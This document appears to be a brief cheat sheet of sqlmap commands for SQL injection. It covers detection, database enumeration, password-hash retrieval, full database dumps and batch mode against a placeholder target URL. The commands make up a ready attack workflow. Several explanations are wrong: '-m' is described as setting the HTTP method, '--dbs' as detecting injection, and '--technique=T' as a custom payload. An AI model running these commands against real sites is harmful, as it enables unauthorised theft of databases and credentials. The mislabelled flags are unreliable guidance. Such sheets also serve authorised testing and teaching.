# SQLmap Cheat Sheet

## Beginner Concepts

### Basic Usage
```bash
# Basic Usage
sqlmap -u <target_url>

# Detect SQL Injection
sqlmap -u <target_url> --dbs

# Specify HTTP Method
sqlmap -u <target_url> -m <http_method>

# Specify Cookie
sqlmap -u <target_url> --cookie=<cookie_string>

# Specify User-Agent
sqlmap -u <target_url> --user-agent=<user_agent_string>
```

### Intermediate
```bash
# Brute Force Passwords
sqlmap -u <target_url> --passwords

# Dump All Database Data
sqlmap -u <target_url> --dump-all

# Dump Specific Database
sqlmap -u <target_url> -D <database_name> --dump

# Specify Injection Point
sqlmap -u <target_url> --data="<post_data>" --dbms=<dbms_type>

# Time-Based Blind SQL Injection
sqlmap -u <target_url> --time-sec=<time_seconds>

# Custom Injection Payload
sqlmap -u <target_url> --data="<post_data>" --dbms=<dbms_type> --technique=T

# Batch Mode
sqlmap -u <target_url> --batch


```

